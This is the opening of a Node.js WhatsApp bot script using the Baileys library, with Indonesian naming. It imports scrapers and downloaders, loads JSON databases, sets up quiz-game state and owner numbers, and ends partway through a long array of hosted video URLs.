require('./config')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser,  extractImageThumb, URL_REGEX } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const bcl = require('@bochilteam/scraper')        
const chalk = require('chalk')
const { exec, spawn, execSync } = require("child_process")
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,  Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
const axios = require('axios')
const { fromBuffer } = require('file-type')
const path = require('path')
const os = require('os')
const hxz = require('hxz-api')
const Download = require("@phaticusthiccy/open-apis")
const lyricsq = require('music-lyrics')
const moment = require('moment-timezone')
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const xfarr = require('xfarr-api')
const maker = require('mumaker')
const PhoneNumber = require('awesome-phonenumber')
const cheerio = require('cheerio')
const ms = require('parse-ms')
const FormData = require('form-data')
const fetch = require('node-fetch')
const api = require("caliph-api")
const yts = require('yt-search')
const { tiktokDownloader, instaDownloader, zippyDownloader, mediafireDownloader } = require('./lib/downloader')
const { smsg, formatp, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, fetchText, getRandom, generateHash, generateProfilePicture } = require('./lib/myfunc')
const { addCommands, checkCommands, deleteCommands } = require('./lib/autoresp')
const { ytPlay, ytMp3, ytMp4 } = require('./lib/yt')
const { Pixiv } = require('@ibaraki-douji/pixivts')
const pixiv = new Pixiv()


const { TelegraPh } = require ('./lib/uploader')
const hit = JSON.parse(fs.readFileSync('./lib/db/dash.json'))
const { ttp } = require('./lib/canvas');

//anu
const { color } = require("./lib/color")

//db json
const ban = JSON.parse(fs.readFileSync('./lib/db/ban.json'))
const afk = JSON.parse(fs.readFileSync('./lib/db/afk.json'))
const game = JSON.parse(fs.readFileSync('./lib/db/game.json'))
const cmdmedia = JSON.parse(fs.readFileSync('./lib/db/cmd.json'))
const users = JSON.parse(fs.readFileSync('./lib/db/user.json'))
const email = JSON.parse(fs.readFileSync('./lib/db/email.json'))
const { addblockcmd, deleteblockcmd, checkblockcmd } = require("./lib/blockcmd");
const { addError,clearAllError, deleteError, checkError } = require("./lib/totalerror")
const listcmdblock = JSON.parse(fs.readFileSync('./lib/blockcmd.json'))
const listerror = JSON.parse(fs.readFileSync('./lib/listerror.json'))
const commandsDB = JSON.parse(fs.readFileSync('./lib/db/respon.json'))
const turbrek = `break`

serial = generateHash(20)
shop = '⬡'
isAvail = true;
// Database Game
const kuismath = game.math = []
const _family100 = game.family100 = []
const tebakkata = game.tebakkata = []
const tebakbendera = game.tebakbendera = []
const siapaaku = game.siapaaku = []
const tebakkalimat = game.tebakkalimat = []
const caklontong = game.caklontong = []
const susunkata = game.susunkata = []
const tekateki = game.tekateki = []
const tebakkabupaten = game.tebakkabupaten = []
const tebakkimia = game.tebakkimia = []
const tebaklirik = game.tebaklirik = []
const tebaktebakan = game.tebaktebakan = []
let Ownerin ="6281314050985@s.whatsapp.net"                
let ownerNumber = [`6289502991778@s.whatsapp.net`,`6281314050985@s.whatsapp.net`,`6281314050985@s.whatsapp.net`]
//=================================================//
// Check Bandwidth
let { sizeFormatter } = require("human-readable");
let formatd = sizeFormatter({
std: "JEDEC", // 'SI' (default) | 'IEC' | 'JEDEC'
decimalPlaces: 2,
keepTrailingZeroes: false,
render: (literal, symbol) => `${literal} ${symbol}B`,
});
async function checkBandwidth() {
var data = require("node-os-utils")
data = await data.netstat.stats()
let ind = 0
let out = 0
for (let i of data) {
ind = ind + i.inputBytes
out = out + i.outputBytes
}
return {
download: formatd(ind),
upload: formatd(out)
}
}

global.db = JSON.parse(fs.readFileSync('./lib/db/database.json'))
if (global.db) global.db = {
    sticker: {},
    database: {},
    game: {},
    others: {},
    users: {},
    ...(global.db || {})
}

const asupan12 = [
"https://b.top4top.io/m_1931yxodg0.mp4",
"https://k.top4top.io/m_193161p380.mp4",
"https://l.top4top.io/m_1931i4g3p1.mp4",
"https://a.top4top.io/m_1931tjlio2.mp4",
"https://g.top4top.io/m_1931z2mc40.mp4",
"https://h.top4top.io/m_1931auyof1.mp4",
"https://i.top4top.io/m_19315hrle2.mp4",
"https://j.top4top.io/m_1931xul5a3.mp4",
"https://l.top4top.io/m_1931o92nr0.mp4",
"https://a.top4top.io/m_1931j1rh21.mp4",
"https://b.top4top.io/m_1931iaqpg2.mp4",
"https://c.top4top.io/m_1931s5zlj3.mp4",
"https://d.top4top.io/m_1931x0g5a4.mp4",
"https://i.top4top.io/m_1931oj76n0.mp4",
"https://j.top4top.io/m_19319gl3d1.mp4",
"https://k.top4top.io/m_1931u52cq2.mp4",
"https://l.top4top.io/m_1931mvgj73.mp4",
"https://a.top4top.io/m_1931u07oz4.mp4",
"https://j.top4top.io/m_1931h1fo60.mp4",
"https://k.top4top.io/m_1931mro3u1.mp4",
"https://l.top4top.io/m_1931kx0ac2.mp4",
"https://a.top4top.io/m_1931g9ezq3.mp4",
"https://b.top4top.io/m_1931plin14.mp4",
"https://c.top4top.io/m_1931aaxri5.mp4",
"https://d.top4top.io/m_1931ijzzn6.mp4",
"https://e.top4top.io/m_1931ugycd7.mp4",
"https://f.top4top.io/m_1931l14nk8.mp4",
"https://g.top4top.io/m_1931crgqt9.mp4",
"https://l.top4top.io/m_1931ufrul0.mp4",
"https://a.top4top.io/m_1931jbdpk1.mp4",
"https://c.top4top.io/m_1931aj9nm2.mp4",
"https://d.top4top.io/m_1931cnsal3.mp4",
"https://e.top4top.io/m_1931d4kc74.mp4",
"https://f.top4top.io/m_1931bih8q5.mp4",
"https://g.top4top.io/m_1931xx7aa6.mp4",
"https://h.top4top.io/m_1931g3zsq7.mp4",
"https://a.top4top.io/m_1931m74wd0.mp4",
"https://b.top4top.io/m_1931p8tfm1.mp4",
"https://e.top4top.io/m_1931aj8iv0.mp4",
"https://f.top4top.io/m_1931szguy1.mp4",
"https://g.top4top.io/m_1931l73ry2.mp4",
"https://h.top4top.io/m_1931yhznj3.mp4",
"https://i.top4top.io/m_1931kmtp34.mp4",
"https://j.top4top.io/m_1931snhdg5.mp4",
"https://k.top4top.io/m_1931ay1jz6.mp4",
"https://l.top4top.io/m_1931x70mk7.mp4",
"https://a.top4top.io/m_19319mvvf8.mp4",
"https://b.top4top.io/m_1931icmzd9.mp4",
"https://h.top4top.io/m_19316oo0s0.mp4",
"https://i.top4top.io/m_1931cvvpt1.mp4",
"https://e.top4top.io/m_1930ns2zo0.mp4",
"https://k.top4top.io/m_1930j9i810.mp4",
"https://f.top4top.io/m_1930wtj580.mp4",
"https://d.top4top.io/m_1930a2isv0.mp4",
"https://e.top4top.io/m_1930wbgc41.mp4",
"https://f.top4top.io/m_1930urbj02.mp4",
"https://b.top4top.io/m_1930ceiqv0.mp4",
"https://i.top4top.io/m_1931a0z6o0.mp4",
"https://a.top4top.io/m_193190b500.mp4",
"https://b.top4top.io/m_1931dcixz1.mp4",
"https://g.top4top.io/m_19317gpjp0.mp4",
"https://i.top4top.io/m_1931cc22w1.mp4",
"https://j.top4top.io/m_1931xn6412.mp4",
"https://g.top4top.io/m_1931silxz0.mp4",
"https://h.top4top.io/m_1931as4mg1.mp4",
"https://i.top4top.io/m_1931p9j5v0.mp4",
"https://e.top4top.io/m_1931mgeuy0.mp4",
"https://f.top4top.io/m_1931lw9381.mp4",
"https://g.top4top.io/m_1931vm0dk2.mp4",
"https://h.top4top.io/m_1931fiv8x3.mp4",
"https://b.top4top.io/m_1931jm3dt0.mp4",
"https://e.top4top.io/m_1931i7yag1.mp4",
"https://f.top4top.io/m_1931dr5ya2.mp4",
"https://g.top4top.io/m_193172kpg3.mp4",
"https://h.top4top.io/m_1931j3b224.mp4",
"https://j.top4top.io/m_19317ykt25.mp4",
"https://k.top4top.io/m_1931o0vh16.mp4",
"https://l.top4top.io/m_1931ssfbn7.mp4",
"https://a.top4top.io/m_19318t7458.mp4",
"https://b.top4top.io/m_1931vhu759.mp4",
"https://e.top4top.io/m_1930wespy0.mp4",
"https://e.top4top.io/m_19303zfi20.mp4",
"https://j.top4top.io/m_1930t00kx0.mp4",
"https://e.top4top.io/m_1930kx7hi0.mp4",
"https://c.top4top.io/m_19307g6kd0.mp4",
"https://f.top4top.io/m_19306yk4c0.mp4",
"https://i.top4top.io/m_1930y1u780.mp4",
"https://j.top4top.io/m_1930ilsyy0.mp4",
"https://i.top4top.io/m_19301948b0.mp4",
"https://d.top4top.io/m_1930zg8460.mp4",
"https://i.top4top.io/m_19301yozl0.mp4",
"https://g.top4top.io/m_1930qjr2q0.mp4",
"https://l.top4top.io/m_1930x1wp50.mp4",
"https://a.top4top.io/m_1930zr1041.mp4",
"https://b.top4top.io/m_1930s29hq2.mp4",
"https://a.top4top.io/m_1930kbo0y0.mp4",
"https://j.top4top.io/m_1930xek9z0.mp4",
"https://i.top4top.io/m_1930s7gb80.mp4",
"https://c.top4top.io/m_1930w0dbu0.mp4",
"https://d.top4top.io/m_1930xu4kd1.mp4",
"https://a.top4top.io/m_1930zw2nb0.mp4",
"https://b.top4top.io/m_1930eybjj1.mp4",
"https://g.top4top.io/m_1930fmx330.mp4",
"https://l.top4top.io/m_1930gnlam0.mp4",
"https://g.top4top.io/m_1930twwu50.mp4",
"https://l.top4top.io/m_1930qkeh70.mp4",
"https://l.top4top.io/m_1930wefm20.mp4",
"https://a.top4top.io/m_1930idzd51.mp4",
"https://b.top4top.io/m_1930thxw90.mp4",
"https://d.top4top.io/m_1930pezhp0.mp4",
"https://c.top4top.io/m_1930cjgbx0.mp4",
"https://b.top4top.io/m_1930v6vhg0.mp4",
"https://f.top4top.io/m_1930uh7ud0.mp4",
"https://a.top4top.io/m_1930c9cpb0.mp4",
"https://k.top4top.io/m_19308amkf0.mp4",
"https://d.top4top.io/m_1930wjaq60.mp4",
"https://i.top4top.io/m_1930n2um40.mp4",
"https://i.top4top.io/m_1930e14pi0.mp4",
"https://i.top4top.io/m_1930w6lwf0.mp4",
"https://e.top4top.io/m_19307autl0.mp4",
"https://d.top4top.io/m_1930i6tfc0.mp4",
"https://c.top4top.io/m_1930qmr7u0.mp4",
"https://d.top4top.io/m_1930itbte1.mp4",
"https://i.top4top.io/m_1930ze4oq0.mp4",
"https://j.top4top.io/m_1930kkqyh1.mp4",
"https://f.top4top.io/m_1930zevlz0.mp4",
"https://g.top4top.io/m_1930q0apu1.mp4",
"https://h.top4top.io/m_1930trfsv2.mp4",
"https://l.top4top.io/m_196632pm21.mp4",
"https://k.top4top.io/m_196696fby1.mp4",
"https://i.top4top.io/m_19665qrmn1.mp4",
"https://j.top4top.io/m_19660pebi1.mp4",
"https://d.top4top.io/m_1966zo5kt1.mp4",
"https://h.top4top.io/m_19662lgzi1.mp4",
"https://c.top4top.io/m_1966ukvwr1.mp4",
"https://g.top4top.io/m_1966f042t1.mp4",
"https://f.top4top.io/m_1966rey9j1.mp4",
"https://e.top4top.io/m_1966eqtk21.mp4",
"https://a.top4top.io/m_1966yrtjt1.mp4",
"https://l.top4top.io/m_196664xnz1.mp4",
"https://j.top4top.io/m_19664phob1.mp4",
"https://i.top4top.io/m_1966movai1.mp4",
"https://h.top4top.io/m_1966633ho1.mp4",
"https://f.top4top.io/m_1966o20wm1.mp4",
"https://g.top4top.io/m_1966c5rg21.mp4",
"https://e.top4top.io/m_1966ui8nv1.mp4",
"https://d.top4top.io/m_1966nxtoy1.mp4",
"https://c.top4top.io/m_1966bwd6v1.mp4",
"https://b.top4top.io/m_1966ksnkk1.mp4",
"https://a.top4top.io/m_1966kq4h81.mp4",
"https://k.top4top.io/m_1966d34y01.mp4",
"https://l.top4top.io/m_1966fw13d1.mp4",
"https://j.top4top.io/m_1966xv2121.mp4",
"https://i.top4top.io/m_1966kn6nq1.mp4",
"https://g.top4top.io/m_19663syet1.mp4",
"https://f.top4top.io/m_1966usvco1.mp4",
"https://e.top4top.io/m_196622yeo1.mp4",
"https://d.top4top.io/m_1966skdq31.mp4",
"https://c.top4top.io/m_1966y3ln01.mp4",
"https://b.top4top.io/m_19669nwfm1.mp4",
"https://k.top4top.io/m_19661cuqo1.mp4",
"https://l.top4top.io/m_1966hghj61.mp4",
"https://i.top4top.io/m_1966aoilk1.mp4",
"https://h.top4top.io/m_19661l14p1.mp4",
"https://g.top4top.io/m_1966f8ezr1.mp4",
"https://f.top4top.io/m_19668td551.mp4",
"https://f.top4top.io/m_19668td551.mp4",
"https://e.top4top.io/m_1966pnb5n1.mp4",
"https://c.top4top.io/m_19665y7kq1.mp4",
"https://b.top4top.io/m_19668sbj71.mp4",
"https://a.top4top.io/m_1966z3hc81.mp4",
"https://l.top4top.io/m_1966rdvm71.mp4",
"https://k.top4top.io/m_19665sid21.mp4",
"https://j.top4top.io/m_1966pvisc1.mp4",
"https://i.top4top.io/m_1966q97hd1.mp4",
"https://h.top4top.io/m_1966rhngl1.mp4",
"https://g.top4top.io/m_19667gyf01.mp4",
"https://i.top4top.io/m_1966day6t1.mp4",
"https://g.top4top.io/m_1966svvhh1.mp4",
"https://f.top4top.io/m_19668aept1.mp4",
"https://e.top4top.io/m_1966l3kwr1.mp4",
"https://d.top4top.io/m_1966pizgc1.mp4",
"https://c.top4top.io/m_1966r6dd91.mp4",
"https://b.top4top.io/m_1966gd2y21.mp4",
"https://a.top4top.io/m_1966f28zy1.mp4",
"https://l.top4top.io/m_1966uyrdu1.mp4",
"https://k.top4top.io/m_1966igu2u1.mp4",
"https://j.top4top.io/m_1966h5sv11.mp4",
"https://i.top4top.io/m_1966xgl261.mp4",
"https://h.top4top.io/m_196678ki61.mp4",
"https://f.top4top.io/m_1966eoj2h1.mp4",
"https://g.top4top.io/m_19663sb841.mp4",
"https://e.top4top.io/m_1966nmi0x1.mp4",
"https://d.top4top.io/m_1966jl0qb1.mp4",
"https://b.top4top.io/m_1966knowg1.mp4",
"https://a.top4top.io/m_1966jk07b1.mp4",
"https://j.top4top.io/m_1966jf5ut1.mp4",
"https://k.top4top.io/m_1966dju7g1.mp4",
"https://i.top4top.io/m_1966addcv1.mp4",
"https://h.top4top.io/m_1966j21g31.mp4",
"https://g.top4top.io/m_19662eh9s1.mp4",
"https://f.top4top.io/m_1966vj79r1.mp4",
"https://e.top4top.io/m_1966qlw061.mp4",
"https://d.top4top.io/m_1966lxxwe1.mp4",
"https://a.top4top.io/m_1966dpwax1.mp4",
"https://c.top4top.io/m_1966fewe11.mp4",
"https://l.top4top.io/m_1966yft9o1.mp4",
"https://j.top4top.io/m_19664yeyz1.mp4",
"https://h.top4top.io/m_1966sn0yr1.mp4",
"https://i.top4top.io/m_1966d3dar1.mp4",
"https://g.top4top.io/m_19667cggu1.mp4",
"https://e.top4top.io/m_1966ondhx1.mp4",
"https://c.top4top.io/m_1966bt25g1.mp4",
"https://a.top4top.io/m_1966altcv1.mp4",
"https://b.top4top.io/m_1966w21do1.mp4",
"https://l.top4top.io/m_1966m9dpq1.mp4",
"https://k.top4top.io/m_1966owgko1.mp4",
"https://j.top4top.io/m_1966xsfh81.mp4",
"https://i.top4top.io/m_19669n5k11.mp4",
"https://h.top4top.io/m_19660qdsa1.mp4",
"https://g.top4top.io/m_1966likmn1.mp4",
"https://f.top4top.io/m_1966a9yog1.mp4",
"https://e.top4top.io/m_1966ls2ru1.mp4",
"https://d.top4top.io/m_1966kue2j1.mp4",
"https://c.top4top.io/m_1966p9df21.mp4",
"https://b.top4top.io/m_1966wyuua1.mp4",
"https://b.top4top.io/m_1966z68z61.mp4",
"https://a.top4top.io/m_19660m6mx1.mp4",
"https://k.top4top.io/m_1966q2vx81.mp4",
"https://i.top4top.io/m_1966d50ac1.mp4",
"https://g.top4top.io/m_1966ek2z71.mp4",
"https://h.top4top.io/m_1966nac9z1.mp4",
"https://f.top4top.io/m_1966kfd221.mp4",
"https://e.top4top.io/m_1966uh3i11.mp4",
"https://d.top4top.io/m_19662dvmy1.mp4",
"https://c.top4top.io/m_1966p24i21.mp4",
"https://b.top4top.io/m_1966koom71.mp4",
"https://a.top4top.io/m_19667th9w1.mp4",
"https://l.top4top.io/m_19665ovc21.mp4",
"https://k.top4top.io/m_1966cq5ez1.mp4",
"https://j.top4top.io/m_1966ot1sc1.mp4",
"https://i.top4top.io/m_19664j5pa1.mp4",
"https://h.top4top.io/m_1966qfr1n1.mp4",
"https://g.top4top.io/m_19666vtmi1.mp4",
"https://e.top4top.io/m_1966e1oak1.mp4",
"https://d.top4top.io/m_19660cdkj1.mp4",
"https://c.top4top.io/m_1966udmjr1.mp4",
"https://l.top4top.io/m_19665ncuv1.mp4",
"https://a.top4top.io/m_1966xzuvh1.mp4",
"https://k.top4top.io/m_19668fjzi1.mp4",
"https://j.top4top.io/m_1966a8kng1.mp4",
"https://i.top4top.io/m_1966za3o11.mp4",
"https://h.top4top.io/m_1966s0zyq1.mp4",
"https://g.top4top.io/m_1966zpidw1.mp4",
"https://f.top4top.io/m_1966xayex1.mp4",
"https://e.top4top.io/m_1966jf1kq1.mp4",
"https://d.top4top.io/m_1966lobye1.mp4",
"https://c.top4top.io/m_196672cwt1.mp4",
"https://b.top4top.io/m_1966jmjvo1.mp4",
"https://a.top4top.io/m_19663mpmt1.mp4",
"https://l.top4top.io/m_1966f5gox1.mp4",
"https://k.top4top.io/m_1966o2img1.mp4",
"https://j.top4top.io/m_1966id3xk1.mp4",
"https://i.top4top.io/m_1966v3l621.mp4",
"https://h.top4top.io/m_19664zfvg1.mp4",
"https://g.top4top.io/m_1966qmutz1.mp4",
"https://f.top4top.io/m_1966idhdd1.mp4",
"https://d.top4top.io/m_19667o2n51.mp4",
"https://b.top4top.io/m_196637ev41.mp4",
"https://c.top4top.io/m_1966ca2691.mp4",
"https://a.top4top.io/m_1966wf0cg1.mp4",
"https://l.top4top.io/m_1966bkza51.mp4",
"https://k.top4top.io/m_1966rqdh31.mp4",
"https://j.top4top.io/m_1966za5ju1.mp4",
"https://j.top4top.io/m_1966jbfiw1.mp4",
"https://a.top4top.io/m_1966v6iz11.mp4",
"https://l.top4top.io/m_1966g6ny11.mp4",
"https://k.top4top.io/m_1966lgval1.mp4",
"https://j.top4top.io/m_1966j1lbr1.mp4",
"https://h.top4top.io/m_19663fl981.mp4",
"https://g.top4top.io/m_1966ke92o1.mp4",
"https://f.top4top.io/m_1966thn7c1.mp4",
"https://e.top4top.io/m_1966dtivb1.mp4",
"https://d.top4top.io/m_1966b26rp1.mp4",
"https://c.top4top.io/m_19668lsis1.mp4",
"https://b.top4top.io/m_1966rqqkv1.mp4",
"https://a.top4top.io/m_1966e4e3q1.mp4",
"https://k.top4top.io/m_19668tucd1.mp4",
"https://l.top4top.io/m_19668mle71.mp4",
"https://h.top4top.io/m_1966wxszt1.mp4",
"https://g.top4top.io/m_19660yx0f1.mp4",
"https://f.top4top.io/m_1966m2pk31.mp4",
"https://e.top4top.io/m_19664e93p1.mp4",
"https://d.top4top.io/m_1966jz0jr1.mp4",
"https://c.top4top.io/m_19661r7dt1.mp4",
"https://b.top4top.io/m_1966e3ts01.mp4",
"https://a.top4top.io/m_1966ruanp1.mp4",
"https://l.top4top.io/m_1966j1xcr1.mp4",
"https://k.top4top.io/m_19663jia71.mp4",
"https://j.top4top.io/m_1966reikf1.mp4",
"https://i.top4top.io/m_1966v3rjk1.mp4",
"https://h.top4top.io/m_1966oktgx1.mp4",
"https://g.top4top.io/m_1966x1zbo1.mp4",
"https://f.top4top.io/m_19661otau1.mp4",
"https://i.top4top.io/m_1966bqiim1.mp4",
"https://e.top4top.io/m_1966kwou51.mp4",
"https://d.top4top.io/m_196644tqw1.mp4",
"https://c.top4top.io/m_19664ld4z1.mp4",
"https://b.top4top.io/m_1966f4u101.mp4",
"https://a.top4top.io/m_1966aj6n61.mp4",
"https://l.top4top.io/m_1966ssrfs1.mp4",
"https://k.top4top.io/m_1966lq0uo1.mp4",
"https://j.top4top.io/m_1966hvv5t1.mp4",
"https://i.top4top.io/m_19666dxii1.mp4",
"https://h.top4top.io/m_1966zpl371.mp4",
"https://g.top4top.io/m_19667ld4b1.mp4",
"https://f.top4top.io/m_19663zw2x1.mp4",
"https://e.top4top.io/m_19667hx161.mp4",
"https://d.top4top.io/m_1966xvyhj1.mp4",
"https://c.top4top.io/m_19666vlaq1.mp4",
"https://b.top4top.io/m_1966svejo1.mp4",
"https://a.top4top.io/m_1966ohu0h1.mp4",
"https://l.top4top.io/m_1966rt1qs1.mp4",
"https://k.top4top.io/m_1966fjpnj1.mp4",
"https://j.top4top.io/m_19677oxbd1.mp4",
"https://i.top4top.io/m_19672o6ll1.mp4",
"https://h.top4top.io/m_19676f2ju1.mp4",
"https://f.top4top.io/m_19699qk6w1.mp4",
"https://g.top4top.io/m_1967uvzs61.mp4",
"https://telegra.ph/file/8691e8e69a3b687f73e34.mp4",
"https://telegra.ph/file/5a2dc9ae7be67d67d0c0a.mp4",
"https://telegra.ph/file/2fb27f766135de0e6a39e.mp4",
"https://telegra.ph/file/9ec4d405b3969abffc00d.mp4",
"https://telegra.ph/file/7a9215dc550867cedb274.mp4",
"https://telegra.ph/file/a5af7412580d559216d82.mp4",
"https://telegra.ph/file/005ab9197d7a23e69333d.mp4",
"https://telegra.ph/file/74817e8f003323e0b245a.mp4",
"https://telegra.ph/file/f3a5a3bfc7509e3bac40d.mp4",
"https://telegra.ph/file/2bb53a49da62567aa3984.mp4",
"https://telegra.ph/file/c3bb9f8a3f7f6a432c4e0.mp4",
"https://telegra.ph/file/672d46689ef6a4a806253.mp4",
"https://telegra.ph/file/8e99cf86cf9dde7b55006.mp4",
"https://telegra.ph/file/3a67c2467ff0e65ec69aa.mp4",
"https://telegra.ph/file/28bd7b10a3c5d28c59c9e.mp4",
"https://telegra.ph/file/78487fe7ec7b8d879b447.mp4",
"https://telegra.ph/file/23d20c2a17e554b875a07.mp4",
"https://telegra.ph/file/9c725af44b26d9b9e8951.mp4",
"https://telegra.ph/file/b8646c8f9aa3233ef99f0.mp4",
"https://telegra.ph/file/26cc700cf8d6562bdc147.mp4",
"https://telegra.ph/file/dfa496af2551a6cd53e7d.mp4",
"https://telegra.ph/file/3b58870e071c1f35649b0.mp4",
"https://telegra.ph/file/95b3ae5579ab117a82f32.mp4",
"https://telegra.ph/file/8f1011f681c771fced13d.mp4",
"https://telegra.ph/file/ff24e834ab2379c3a45fe.mp4",
"https://telegra.ph/file/eb1fecb73d3176b4a00be.mp4",
"https://telegra.ph/file/fcb6fc41ef23891788eeb.mp4",
"https://telegra.ph/file/bfc449b7f30f62744b190.mp4",
"https://telegra.ph/file/25935f9aaa7c9ad251717.mp4",
"https://telegra.ph/file/ad235b03670844ab9a4ea.mp4",
"https://telegra.ph/file/808b2df5c93e0c403cbdf.mp4",
"https://telegra.ph/file/e46607372a6a0f37b9948.mp4",
"https://telegra.ph/file/d516d727f9c4a5e7c617e.mp4",
"https://telegra.ph/file/29a9401491f5c582d2946.mp4",
"https://telegra.ph/file/51b3bf85982da2434f072.mp4",
"https://telegra.ph/file/330e8d40aa0b0e43e993b.mp4",
"https://telegra.ph/file/935cfcf4d7ae6ebc2361e.mp4",
"https://telegra.ph/file/62a4a951ae0454b663d1c.mp4",
"https://telegra.ph/file/90e5832b44d5086c557dc.mp4",
"https://telegra.ph/file/8965c11937929106b5d1b.mp4",
"https://telegra.ph/file/913f78f66af4261f95008.mp4",
"https://telegra.ph/file/1ed89875710bf85da811d.mp4",
"https://telegra.ph/file/04edc8440918ff969c199.mp4",
"https://telegra.ph/file/5cfccc1d8b4d0445e5fa6.mp4",
"https://telegra.ph/file/1c63ed18eb575374f664d.mp4",
"https://telegra.ph/file/93adcbe57d85c36cddf1a.mp4",
"https://telegra.ph/file/3904953f0662281ec82f9.mp4",
"https://telegra.ph/file/f0b08ae66191175b19fe9.mp4",
"https://telegra.ph/file/6e9ffcd1b30a3220e4ac3.mp4",
"https://telegra.ph/file/dcb1e1d13a96176c85cdb.mp4",
"https://telegra.ph/file/7c79d35b4cbec23410a2f.mp4",
"https://telegra.ph/file/0dd3a91a043c833d40b74.mp4",
"https://telegra.ph/file/e231cc4de64618e5b0ccf.mp4",
"https://telegra.ph/file/0b79d717dc0e1b42cda39.mp4",
"https://telegra.ph/file/c10830b174aca78888057.mp4",
"https://telegra.ph/file/517b171d0d4cd2b597549.mp4",
"https://telegra.ph/file/014c269e5e41aa78f8914.mp4",
"https://telegra.ph/file/a62486d35d2ea93456f80.mp4",
"https://telegra.ph/file/ccf334a3e539c51c2c1ca.mp4",
"https://telegra.ph/file/300f0ddcb577d13602325.mp4",
"https://telegra.ph/file/0f128e973c149667d15dc.mp4",
"https://telegra.ph/file/088c09cc51dcb8f17f672.mp4",
"https://telegra.ph/file/80f8ca8f77830a11681e1.mp4",
"https://telegra.ph/file/1f8119c731a93babffe0b.mp4",
"https://telegra.ph/file/8f9d055fcade2c81ca3fd.mp4",
"https://telegra.ph/file/8e67c32596dda16511506.mp4",
"https://telegra.ph/file/c5e7a6c63e0094b509f5c.mp4",
"https://telegra.ph/file/ef8cbb3f81d5771306bb5.mp4",
"https://telegra.ph/file/7c9ebc3cc777a77b13c75.mp4",
"https://telegra.ph/file/a09c76f83eb86f288d6ae.mp4",
"https://telegra.ph/file/3713071a3c1296da7001d.mp4",
"https://telegra.ph/file/6c832fe6e4dd2011598c1.mp4",
"https://telegra.ph/file/2c777aa493961c0efd973.mp4",
"https://telegra.ph/file/9602195d64ecabd67576c.mp4",
"https://telegra.ph/file/70e5d235194486bafda8d.mp4",
"https://telegra.ph/file/5b9f48cc171918e1d4547.mp4",
"https://telegra.ph/file/bb420efaabca11ec14d1a.mp4",
"https://telegra.ph/file/d86e10be91aef7e50aeed.mp4",
"https://telegra.ph/file/4c25d738d6f8e6e09766b.mp4",
"https://telegra.ph/file/ffcaef2b67d736fe3681b.mp4",
"https://telegra.ph/file/eb0509576b1ac878bc5e1.mp4",
"https://telegra.ph/file/fb2bf33ec37c0e7a94cd2.mp4",
"https://telegra.ph/file/398e803ff551b8234e976.mp4",
"https://telegra.ph/file/1890fb2116028fa681ed8.mp4",
"https://telegra.ph/file/1966362de624ef565c0f9.mp4",
"https://telegra.ph/file/2c453e97d36e3a0a18048.mp4",
"https://telegra.ph/file/0f34f613252df6687ad39.mp4",
"https://telegra.ph/file/5502ab71acf8f21e19446.mp4",
"https://telegra.ph/file/a6fb0f8a7c4fb53deb781.mp4",
"https://telegra.ph/file/d8a934b245eb9c8133a54.mp4",
"https://telegra.ph/file/9840d61b2d78683feedcb.mp4",
"https://telegra.ph/file/86fba8fc5fdd44dbdbfcd.mp4",
"https://telegra.ph/file/1890fb2116028fa681ed8.mp4",
"https://telegra.ph/file/b57d4a6cce735f531fb33.mp4",
"https://telegra.ph/file/3fb4571924162a704449b.mp4",
"https://telegra.ph/file/f712c7fb49cc477d22c57.mp4",
"https://telegra.ph/file/04a025115d46f7876a06d.mp4",
"https://telegra.ph/file/a6fb0f8a7c4fb53deb781.mp4",
"https://telegra.ph/file/6dc47c8fbf0c17071259b.mp4",
"https://telegra.ph/file/b499b6baa49002725ee17.mp4",
"https://telegra.ph/file/b46f7fa497f0138fa6ce8.mp4",
"https://telegra.ph/file/9eb7c9debbe73c7fb26f8.mp4",
"https://telegra.ph/file/724db67e72b9c54fe07c4.mp4",
"https://telegra.ph/file/a289b8fdd7940bf463af2.mp4",
"https://telegra.ph/file/34575988f81ec8006b485.mp4",
"https://telegra.ph/file/86970597b442b6401cc5c.mp4",
"https://telegra.ph/file/f667dfcd02ec7519959dd.mp4",
"https://telegra.ph/file/c967fd4b0f2a6eff57680.mp4",
"https://telegra.ph/file/2dbf54357f75c6b53ccdf.mp4",
"https://telegra.ph/file/1254a53debda1b90561f4.mp4",
"https://telegra.ph/file/55c16a7008dd987912620.mp4",
"https://telegra.ph/file/dd2d452b049ab5a4800c6.mp4",
"https://telegra.ph/file/57bebb0f85c3604138907.mp4",
"https://telegra.ph/file/5d279822d5f44da5af16f.mp4",
"https://telegra.ph/file/06cc5f4520375ce712a3c.mp4",
"https://telegra.ph/file/adbc82790a92bd55af0cf.mp4",
"https://telegra.ph/file/0138e30c5a6d219bf2007.mp4",
"https://telegra.ph/file/853e841416e0c939b02b7.mp4",
"https://telegra.ph/file/032e6dd945a114db1944e.mp4",
"https://telegra.ph/file/d10bb098e9d33f385156a.mp4",
"https://telegra.ph/file/b9f34aa1929b311adeb02.mp4",
"https://telegra.ph/file/e9dc0338a0fae2db14a68.mp4",
"https://telegra.ph/file/be62e80a648a893f17f65.jpg",
"https://telegra.ph/file/434a6af2871fc83c828e0.mp4",
"https://telegra.ph/file/611742bf9697a98fd9247.mp4",
"https://telegra.ph/file/4d7ef0cb1f68f4e617dcb.mp4",
"https://telegra.ph/file/33ffa80d995f4b99ecba9.mp4",
"https://telegra.ph/file/7aa11c5827e1dcce1b74d.mp4",
"https://telegra.ph/file/63aa3b9995e3d5ce20d1a.mp4",
"https://telegra.ph/file/6fd357d1f7db8018fab43.mp4",
"https://telegra.ph/file/ba5f71f7ad64258cefe23.mp4",
"https://telegra.ph/file/f49df5f6c08f8f481ca87.mp4",
"https://telegra.ph/file/fbb2a4faf54950de7c37a.mp4",
